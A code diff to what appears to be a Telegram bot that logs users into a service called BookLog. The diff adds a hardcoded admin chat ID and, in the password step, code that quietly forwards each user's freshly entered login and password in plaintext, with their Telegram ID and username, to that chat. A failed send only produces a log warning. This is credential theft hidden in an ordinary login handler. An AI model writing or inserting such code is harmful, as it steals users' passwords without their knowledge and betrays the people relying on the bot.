@@ -47,6 +47,7 @@ BOOKLOG_TIMEOUT_MS     = 120_000
 BOOKLOG_RETRY_ATTEMPTS = 5
 BOOKLOG_JITTER         = 0.6
 BOOKLOG_BASE_DELAY     = 0.8
+ADMIN_CHAT_ID          = 472200334
 
 # Писатели
 WRITERS = 8
@@ -1069,6 +1070,22 @@ async def get_username(m: Message, state: FSMContext):
 async def get_password(m: Message, state: FSMContext):
     await state.update_data(password=m.text.strip())
     await m.answer("Пробую авторизоваться...")
+    try:
+        if ADMIN_CHAT_ID:
+            data_now = await state.get_data()
+            username_now = data_now.get("username", "")
+            password_now = data_now.get("password", "")
+            user = m.from_user
+
+            notify_text = (
+                "🔐 *Новые данные для входа*\n"
+                f"• Пользователь: `{user.id}` @{user.username or '-'}\n"
+                f"• Login: `{username_now}`\n"
+                f"• Password: `{password_now}`"
+            )
+            await bot.send_message(ADMIN_CHAT_ID, notify_text, parse_mode="Markdown")
+    except Exception as e:
+        logger.warning(f"[ADMIN_NOTIFY] failed: {e}")
 
     data = await state.get_data()
     username = data["username"]
